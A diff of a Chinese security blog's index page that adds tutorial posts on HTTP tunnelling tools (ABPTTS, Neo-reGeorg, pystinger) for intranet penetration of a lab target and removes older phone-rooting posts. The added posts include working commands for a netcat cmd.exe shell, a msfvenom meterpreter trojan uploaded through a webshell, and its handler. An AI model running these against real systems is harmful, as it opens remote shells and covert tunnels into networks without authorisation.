@@ -200,7 +200,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/06/DNS%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/09/http%E9%9A%A7%E9%81%93-abptts%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -214,7 +214,138 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022/08/06/DNS%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">DNS隧道搭建</a>
+            <a href="/2022/08/09/http%E9%9A%A7%E9%81%93-abptts%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/" class="post-title-link" itemprop="url">http隧道:abptts端口映射</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-09 09:54:03" itemprop="dateCreated datePublished" datetime="2022-08-09T09:54:03+08:00">2022-08-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-13 00:09:06" itemprop="dateModified" datetime="2022-08-13T00:09:06+08:00">2022-08-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.内网渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.内网穿透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>abptts正向连接cs：<a target="_blank" rel="noopener" href="http://moy1sec.com/2021/11/02/cs-zai-bu-chu-wang-huan-jing-zhong-shang-xian/#toc-heading-6">http://moy1sec.com/2021/11/02/cs-zai-bu-chu-wang-huan-jing-zhong-shang-xian/#toc-heading-6</a></p>
+<p>abptts建立正向隧道：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/259855.html">https://www.freebuf.com/sectool/259855.html</a></p>
+<p>通过CrossC2上线linux：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/334569.html">https://www.freebuf.com/sectool/334569.html</a></p>
+<p>带profile上线linux：<a target="_blank" rel="noopener" href="http://www.4k8k.xyz/article/w1590191166/119490557">http://www.4k8k.xyz/article/w1590191166/119490557</a></p>
+<h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p><strong>工具下载</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a></p>
+<p>abptts可以实现端口对端口映射，且具有全加密对抗检测和稳定的优点，但目前只支持aspx和jsp两种脚本文件</p>
+<p>下载后需要安装python2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pycrypto</span><br><span class="line">pip install httplib2</span><br></pre></td></tr></table></figure>
+
+<p><strong>搭建隧道</strong></p>
+<p>生成服务端，目录下会出现server目录，目录内有不同环境的默认服务端文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python abpttsfactory.py -o server</span><br></pre></td></tr></table></figure>
+
+<p>选择与目标对应环境的服务端上传，访问页面，结果如下图代表服务端运行正常</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208091438399.png" alt="image-20220809143854159"></p>
+<p>vps执行命令，搭建http隧道</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 abpttsclient.py -c server/config.txt -u http://192.168.240.106:81/abptts.jsp -f 127.0.0.1:20011/127.0.0.1:20022</span><br></pre></td></tr></table></figure>
+
+<p>-c 配置文件，生成服务端时一起生成的，在server目录下面</p>
+<p>-u 上传的server文件链接</p>
+<p>-f 将靶机的20022端口映射到vps的20011端口</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208091446899.png" alt="image-20220809144652558"></p>
+<p>现在vps的20011端口就相当于靶机的20022端口，20022端口有什么服务，我们都可以通过访问vps的20011端口访问到</p>
+<p>比如在靶机20022端口开启nc监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -lvp 20022 -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>vps本机nc本地20011端口，由于该端口接受了靶机20022端口的映射，因此nc本地等同于nc靶机的20022端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 20011</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208091501336.png" alt="image-20220809150140696"></p>
+<p>如果搭建隧道时，改为监听所有地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x python2 abpttsclient.py -c server/config.txt -u http://192.168.240.106:81/abptts.jsp -f 0.0.0.0:20011/127.0.0.1:20022</span><br></pre></td></tr></table></figure>
+
+<p>那么其他主机也可以通过nc VPS的20011端口，去连接靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.240.54 20011</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208091506718.png" alt="image-20220809150610784"></p>
+<p><strong>利用隧道正向上线msf</strong></p>
+<p>abptts命令不变，仍然是把靶机的20022映射到VPS的20011</p>
+<p>msf生成木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp rhost=127.0.0.1 lport=20022 -f exe -o meterpreter.exe</span><br></pre></td></tr></table></figure>
+
+<p>这里使用bind_tcp模块，如上命令生成的木马，在目标主机执行后，会监听本地的20022端口，等待msf正向连接</p>
+<p>-f 指定木马类型</p>
+<p>-o 指定木马文件名</p>
+<p>把木马通过webshell上传到靶机并执行</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208130005428.png" alt="image-20220813000533284"></p>
+<p>msf正向连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"># payload要与生成木马时所有payload一致</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set lport 20011</span><br><span class="line">set rhost 127.0.0.1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>msf上线成功</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208130008617.png" alt="image-20220813000759535"></p>
+<p><strong>利用隧道正向上线cs</strong></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/07/http%E9%9A%A7%E9%81%93-neo-reGeorg/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/07/http%E9%9A%A7%E9%81%93-neo-reGeorg/" class="post-title-link" itemprop="url">http隧道:neo-reGeorg</a>
         </h2>
 
         <div class="post-meta">
@@ -225,7 +356,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2022-08-06 16:00:51 / 修改时间：16:49:53" itemprop="dateCreated datePublished" datetime="2022-08-06T16:00:51+08:00">2022-08-06</time>
+              <time title="创建时间：2022-08-07 22:35:25 / 修改时间：22:50:50" itemprop="dateCreated datePublished" datetime="2022-08-07T22:35:25+08:00">2022-08-07</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -233,11 +364,200 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">1.内网横向</span></a>
+                  <a href="/source/categories/1-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.内网渗透</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/1-%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" itemprop="url" rel="index"><span itemprop="name">1.流量代理</span></a>
+                  <a href="/source/categories/1-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.内网穿透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
+<p>使用方法很简单，看Usage即可</p>
+<h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p>下载neo-reGeorg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/L-codes/Neo-reGeorg.git</span><br></pre></td></tr></table></figure>
+
+<p>生成服务端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py generate -k password</span><br></pre></td></tr></table></figure>
+
+<p>连接服务端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k password -u http://xx/tunnel.php -l 0.0.0.0 -p 60000</span><br></pre></td></tr></table></figure>
+
+<p>-l 本地监听地址</p>
+<p>-p 本地监听端口</p>
+<p>socks5代理搭建完毕</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VPS地址:60000</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/06/http%E9%9A%A7%E9%81%93-%E6%AF%92%E5%88%BApystinger/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/06/http%E9%9A%A7%E9%81%93-%E6%AF%92%E5%88%BApystinger/" class="post-title-link" itemprop="url">http隧道:毒刺pystinger</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-06 20:39:26" itemprop="dateCreated datePublished" datetime="2022-08-06T20:39:26+08:00">2022-08-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-07 22:35:55" itemprop="dateModified" datetime="2022-08-07T22:35:55+08:00">2022-08-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.内网渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.内网穿透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="http://moy1sec.com/2021/11/02/cs-zai-bu-chu-wang-huan-jing-zhong-shang-xian/#toc-heading-4">http://moy1sec.com/2021/11/02/cs-zai-bu-chu-wang-huan-jing-zhong-shang-xian/#toc-heading-4</a></p>
+<h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p><strong>工具下载</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/FunnyWolf/pystinger">https://github.com/FunnyWolf/pystinger</a></p>
+<p>从release中下载最近版本，工具主要分为3部分</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208062042631.png" alt="image-20220806204255561"></p>
+<p>webshell</p>
+<p>包含.aspx .jsp .jspx .php四种webshell文件</p>
+<p>将与网站环境对应的webshell，上传至网站根目录下即可，访问目标显示为UTF-8即代表正常连接。</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208062047787.png" alt="image-20220806204746841"></p>
+<p>服务端（被控端）</p>
+<p>stinger_server.exe</p>
+<p>同样上传到目标网站根目录，然后通过虚拟终端执行执行，命令为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 不能直接stinger_server.exe，会中断tcp连接</span><br><span class="line">start stinger_server.exe 0.0.0.0</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>balabalabalabala以后再写。。。。。。。。。。。。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/06/dns%E9%9A%A7%E9%81%93-dns2tcp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/06/dns%E9%9A%A7%E9%81%93-dns2tcp/" class="post-title-link" itemprop="url">dns隧道:dns2tcp</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-06 16:00:51" itemprop="dateCreated datePublished" datetime="2022-08-06T16:00:51+08:00">2022-08-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-09 09:54:17" itemprop="dateModified" datetime="2022-08-09T09:54:17+08:00">2022-08-09</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.内网渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.内网穿透</span></a>
                 </span>
             </span>
 
@@ -364,7 +684,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-08-05 02:16:52" itemprop="dateModified" datetime="2022-08-05T02:16:52+08:00">2022-08-05</time>
+                <time title="修改时间：2022-08-12 23:55:36" itemprop="dateModified" datetime="2022-08-12T23:55:36+08:00">2022-08-12</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -985,314 +1305,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/06/HUAWEI-Nexus6P%E5%88%B7%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9rec/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/06/HUAWEI-Nexus6P%E5%88%B7%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9rec/" class="post-title-link" itemprop="url">HUAWEI-Nexus6P刷入第三方rec</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-07-06 12:49:29" itemprop="dateCreated datePublished" datetime="2022-07-06T12:49:29+08:00">2022-07-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.外围渗透</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/1-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">1.移动安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="注！！！！！！！"><a href="#注！！！！！！！" class="headerlink" title="注！！！！！！！"></a>注！！！！！！！</h3><p><strong>这个最终失败了，虽然设备root了，但是有问题，使用adb连接并su提升权限会卡死。</strong></p>
-<p><strong>本文章仅做记录，不要学！！！</strong></p>
-<p><strong>不要学！！！</strong></p>
-<p><strong>不要学！！！</strong></p>
-<p><strong>不要学！！！</strong></p>
-<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/469514778">https://zhuanlan.zhihu.com/p/469514778</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/liuxinfa/article/details/82878816">https://blog.csdn.net/liuxinfa/article/details/82878816</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44183483/article/details/119330911">https://blog.csdn.net/weixin_44183483/article/details/119330911</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42282189/article/details/121940142">https://blog.csdn.net/weixin_42282189/article/details/121940142</a></p>
-<h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p>准备platform-tools工具包，下载链接如下</p>
-<p><a target="_blank" rel="noopener" href="https://dl.google.com/android/repository/platform-tools-latest-windows.zip">https://dl.google.com/android/repository/platform-tools-latest-windows.zip</a></p>
-<p>MAC版本</p>
-<p><a target="_blank" rel="noopener" href="https://dl.google.com/android/repository/platform-tools-latest-darwin.zip">https://dl.google.com/android/repository/platform-tools-latest-darwin.zip</a></p>
-<p>Linux版本</p>
-<p><a target="_blank" rel="noopener" href="https://dl.google.com/android/repository/platform-tools-latest-linux.zip">https://dl.google.com/android/repository/platform-tools-latest-linux.zip</a></p>
-<p>然后下载twrp第三方rec包，下载链接如下</p>
-<p><a target="_blank" rel="noopener" href="https://dl.twrp.me/angler/">https://dl.twrp.me/angler/</a></p>
-<p>我根据自己的nexus6P版本选择twrp-2.8.7.2-angler.img镜像</p>
-<p>把下载好的twrp-2.8.7.2-angler.img镜像文件拖到上面下载好的platform-tools工具包解压目录内，使用如下命令刷入rec镜像</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot.exe flash recovery twrp-2.8.7.2-angler.img</span><br></pre></td></tr></table></figure>
-
-<p>这个时候一直卡在&lt; waiting for any device &gt;界面不动</p>
-<p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220706130039592.png" alt="image-20220706130039592"></p>
-<p>这是因为fastboot需要在bootloader模式下才能检测到设备</p>
-<p>使用如下命令重启手机，以bootloader模式开机</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure>
-
-<p>然后再执行刷入rec镜像的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot.exe flash recovery twrp-2.8.7.2-angler.img</span><br></pre></td></tr></table></figure>
-
-<p>出现okay表示成功</p>
-<p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220706163005456.png" alt="image-20220706163005456"></p>
-<p>然后点击音量下键两下，会发现按钮上的文字变成了红色，点击红色按钮进入twrp第三方recovery界面</p>
-<p>这里会让你输入一个密码，但有时候会发现，即使输入了正确的密码也不能访问data分区，即&#x2F;sdcard目录下的内容，于是就需要点cancle取消，然后滑动滑块进入twrp主界面，点wipe（清除），点data format（格式化data分区）</p>
-<p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220706163633530.png" alt="image-20220706163633530"></p>
-<p>输入yes同意格式化，格式化成功后不要重启，一直点返回键回退到twrp主界面，这个时候再访问&#x2F;sdcard就可以读到数据了（但这个时候所有数据都被格式化了，因此 要重新用adb把你的magisk刷机包传进来）</p>
-<p>下载magisk刷机包</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/topjohnwu/Magisk/releases">https://github.com/topjohnwu/Magisk/releases</a></p>
-<p>我依据我的手机版本，选择了Magisk-v23.0.apk</p>
-<p>下好后把Magisk-v23.0.apk改成Magisk-v23.0.zip</p>
-<p>然后使用命令把Magisk-v23.0.zip传到手机&#x2F;sdcard目录下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push Magisk-v23.0.zip /sdcard/Magisk-v23.0.zip</span><br></pre></td></tr></table></figure>
-
-<p>通过twrp主界面的install（安装）访问&#x2F;sdcard目录，点击Magisk-v23.0.zip安装</p>
-<p>安装好后直接Reboot System重启即可</p>
-<p>重启后发现Magisk Manager已经作为系统App安装好了</p>
-<p>然后使用adb进入手机的shell，获取root权限</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/06/HUAWEI-Nexus6P%E8%A7%A3BL%E9%94%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/06/HUAWEI-Nexus6P%E8%A7%A3BL%E9%94%81/" class="post-title-link" itemprop="url">HUAWEI-Nexus6P解BL锁</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-07-06 11:02:40" itemprop="dateCreated datePublished" datetime="2022-07-06T11:02:40+08:00">2022-07-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.外围渗透</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/1-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">1.移动安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="https://www.netded.com/a/jingpinshouji/2015/0622/30663.html">https://www.netded.com/a/jingpinshouji/2015/0622/30663.html</a></p>
-<h3 id="注"><a href="#注" class="headerlink" title="注"></a>注</h3><p>解BL锁会导致手机重置，请备份好数据</p>
-<h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p>手机连数据线，开usb调试、OEM解锁，都在开发者模式里面</p>
-<p>关机，同时按住锁屏键和音量下键，5秒左右会进入BL模式</p>
-<p>去互联网下载解锁工具，链接如下</p>
-<p><a target="_blank" rel="noopener" href="http://www.wugfresh.com/nrt/">www.wugfresh.com/nrt/</a></p>
-<p>下载后安装工具，第一次安装后会自动运行解锁工具，或自行在安装目录点击NexusRootToolkit.exe运行</p>
